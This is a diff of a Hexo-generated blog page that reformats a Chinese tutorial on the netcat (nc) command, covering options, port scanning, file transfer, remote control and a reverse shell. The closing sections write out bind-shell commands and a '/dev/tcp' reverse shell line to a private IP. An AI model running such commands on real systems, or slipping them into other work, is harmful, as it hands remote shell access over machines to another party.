@@ -30,9 +30,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 7.3.0">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-</head>
+<meta name="generator" content="Hexo 5.0.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 
 
@@ -493,14 +491,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    945
+                    922
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    3 分
                 </div>
                 
 
@@ -519,30 +517,78 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>nc是网络工具中的瑞士军刀。<strong>nc命令</strong> 全称<strong>netcat</strong>，用于TCP、UDP或unix域套接字(uds)的数据流操作，它可以打开TCP连接，发送UDP数据包，监听任意TCP 和UDP端口，同时也可用作做端口扫描，支持IPv4和IPv6，与Telnet的不同在于nc可以编写脚本。</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;]</span><br><span class="line">[-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token punctuation">[</span>-hlnruz<span class="token punctuation">]</span><span class="token punctuation">[</span>-g<span class="token operator">&lt;</span>网关<span class="token punctuation">..</span>.<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-G<span class="token operator">&lt;</span>指向器数目<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-i<span class="token operator">&lt;</span>延迟秒数<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-o<span class="token operator">&lt;</span>输出文件<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-p<span class="token operator">&lt;</span>通信端口<span class="token operator">></span><span class="token punctuation">]</span>
+<span class="token punctuation">[</span>-s<span class="token operator">&lt;</span>来源位址<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-v<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-w<span class="token operator">&lt;</span>超时秒数<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>主机名称<span class="token punctuation">]</span><span class="token punctuation">[</span>通信端口<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-4 只使用IPV4</span><br><span class="line">-6 只使用IPV6</span><br><span class="line">-c 使用tls连接或者监听</span><br><span class="line">-D 启用socket调试开关</span><br><span class="line">-g &lt;网关&gt; # 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line">-G&lt;指向器数目&gt; # 设置来源路由指向器，其数值为4的倍数。</span><br><span class="line">-h 在线帮助。</span><br><span class="line">-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</span><br><span class="line">-l 使用监听模式，管控传入的资料。</span><br><span class="line">-n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line">-o&lt;输出文件&gt; # 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span><br><span class="line">-p&lt;通信端口&gt; # 设置本地主机使用的通信端口。</span><br><span class="line">-r 乱数指定本地与远端主机的通信端口。</span><br><span class="line">-s&lt;来源位址&gt; # 设置本地主机送出数据包的IP地址。</span><br><span class="line">-u 使用UDP传输协议。</span><br><span class="line">-v 显示指令执行过程。</span><br><span class="line">-w&lt;超时秒数&gt; # 设置等待连线的时间。</span><br><span class="line">-z 使用0输入/输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-4</span> 只使用IPV4
+<span class="token parameter variable">-6</span> 只使用IPV6
+<span class="token parameter variable">-c</span> 使用tls连接或者监听
+<span class="token parameter variable">-D</span> 启用socket调试开关
+<span class="token parameter variable">-g</span> <span class="token operator">&lt;</span>网关<span class="token operator">></span> <span class="token comment"># 设置路由器跃程通信网关，最多可设置8个。</span>
+-G<span class="token operator">&lt;</span>指向器数目<span class="token operator">></span> <span class="token comment"># 设置来源路由指向器，其数值为4的倍数。</span>
+<span class="token parameter variable">-h</span> 在线帮助。
+-i<span class="token operator">&lt;</span>延迟秒数<span class="token operator">></span> 设置时间间隔，以便传送信息及扫描通信端口。
+<span class="token parameter variable">-l</span> 使用监听模式，管控传入的资料。
+<span class="token parameter variable">-n</span> 直接使用IP地址，而不通过域名服务器。
+-o<span class="token operator">&lt;</span>输出文件<span class="token operator">></span> <span class="token comment"># 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span>
+-p<span class="token operator">&lt;</span>通信端口<span class="token operator">></span> <span class="token comment"># 设置本地主机使用的通信端口。</span>
+<span class="token parameter variable">-r</span> 乱数指定本地与远端主机的通信端口。
+-s<span class="token operator">&lt;</span>来源位址<span class="token operator">></span> <span class="token comment"># 设置本地主机送出数据包的IP地址。</span>
+<span class="token parameter variable">-u</span> 使用UDP传输协议。
+<span class="token parameter variable">-v</span> 显示指令执行过程。
+-w<span class="token operator">&lt;</span>超时秒数<span class="token operator">></span> <span class="token comment"># 设置等待连线的时间。</span>
+<span class="token parameter variable">-z</span> 使用0输入/输出模式，只在扫描通信端口时使用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p><strong>TCP端口扫描</strong></p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# nc -v -z -w2 192.168.0.3 1-100 </span><br><span class="line">192.168.0.3: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.0.3] 80 (http) open</span><br><span class="line">(UNKNOWN) [192.168.0.3] 23 (telnet) open</span><br><span class="line">(UNKNOWN) [192.168.0.3] 22 (ssh) open</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -v -z -w2 192.168.0.3 1-100 </span>
+<span class="token number">192.168</span>.0.3: inverse <span class="token function">host</span> lookup failed: Unknown <span class="token function">host</span>
+<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">80</span> <span class="token punctuation">(</span>http<span class="token punctuation">)</span> <span class="token function">open</span>
+<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">23</span> <span class="token punctuation">(</span>telnet<span class="token punctuation">)</span> <span class="token function">open</span>
+<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">22</span> <span class="token punctuation">(</span>ssh<span class="token punctuation">)</span> <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>扫描192.168.0.3 的端口 范围是 1-100 <strong>扫描UDP端口</strong></p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# nc -u -z -w2 192.168.0.3 1-1000  # 扫描192.168.0.3 的端口 范围是 1-1000</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -u -z -w2 192.168.0.3 1-1000  # 扫描192.168.0.3 的端口 范围是 1-1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>扫描指定端口</strong></p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# nc -nvv 192.168.0.1 80 # 扫描 80端口</span><br><span class="line">(UNKNOWN) [192.168.0.1] 80 (?) open</span><br><span class="line">y  //用户输入</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -nvv 192.168.0.1 80 # 扫描 80端口</span>
+<span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.1<span class="token punctuation">]</span> <span class="token number">80</span> <span class="token punctuation">(</span>?<span class="token punctuation">)</span> <span class="token function">open</span>
+y  //用户输入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>查看从服务器到目的地的出站端口 443 是否被防火墙阻止</p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -vz acme-v02.api.letsencrypt.org 443 -w2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ncat: Version 7.50 ( https://nmap.org/ncat )</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ncat: Connected to 23.77.214.183:443.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ncat: 0 bytes sent, 0 bytes received <span class="keyword">in</span> 0.07 seconds.</span></span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-vz</span> acme-v02.api.letsencrypt.org <span class="token number">443</span> <span class="token parameter variable">-w2</span>
+<span class="token comment"># Ncat: Version 7.50 ( https://nmap.org/ncat )</span>
+<span class="token comment"># Ncat: Connected to 23.77.214.183:443.</span>
+<span class="token comment"># Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>文件传输</strong></p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接收方提前设置监听端口与要接收的文件名（文件名可自定义）：</span></span><br><span class="line">nc -lp 8888 &gt; node.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">传输方发文件：</span></span><br><span class="line">nc -nv 192.168.75.121 8888  &lt; node_exporter-1.3.1.linux-amd64.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">⚠️ 注意：192.168.75.121是接收方的ip地址。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果希望文件传输结束后自动退出，可以使用下面的命令：</span></span><br><span class="line">nc -lp 8888 &gt; node.tar.gz</span><br><span class="line">nc -nv 192.168.75.121 8888 -i 1 &lt; node_exporter-1.3.1.linux-amd64.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">⚠️ 注意：-i 表示闲置超时时间</span></span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 接收方提前设置监听端口与要接收的文件名（文件名可自定义）：</span>
+<span class="token function">nc</span> <span class="token parameter variable">-lp</span> <span class="token number">8888</span> <span class="token operator">></span> node.tar.gz
+
+<span class="token comment"># 传输方发文件：</span>
+<span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span>  <span class="token operator">&lt;</span> node_exporter-1.3.1.linux-amd64.tar.gz
+<span class="token comment"># ⚠️ 注意：192.168.75.121是接收方的ip地址。</span>
+<span class="token comment"># 如果希望文件传输结束后自动退出，可以使用下面的命令：</span>
+<span class="token function">nc</span> <span class="token parameter variable">-lp</span> <span class="token number">8888</span> <span class="token operator">></span> node.tar.gz
+<span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span> <span class="token parameter variable">-i</span> <span class="token number">1</span> <span class="token operator">&lt;</span> node_exporter-1.3.1.linux-amd64.tar.gz
+<span class="token comment"># ⚠️ 注意：-i 表示闲置超时时间</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>远程控制</strong></p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888 -c bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc 192.168.75.121 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端执行下面的命令：</span></span><br><span class="line">nc 192.168.75.121 8888 -c bash</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span>
+<span class="token comment"># 被控制端执行下面的命令：</span>
+<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span>
+<span class="token comment"># 控制端执行下面的命令：</span>
+<span class="token function">nc</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span>
+<span class="token comment"># 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span>
+<span class="token comment"># 控制端执行下面的命令：</span>
+<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span>
+<span class="token comment"># 被控制端执行下面的命令：</span>
+<span class="token function">nc</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>反弹shell</strong></p>
-<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控端执行下面的命令:</span></span><br><span class="line">bash -i &amp;&gt; /dev/tcp/192.168.75.121/8888 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 控制端执行下面的命令：</span>
+<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span>
+<span class="token comment"># 被控端执行下面的命令:</span>
+<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&amp;></span> /dev/tcp/192.168.75.121/8888 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
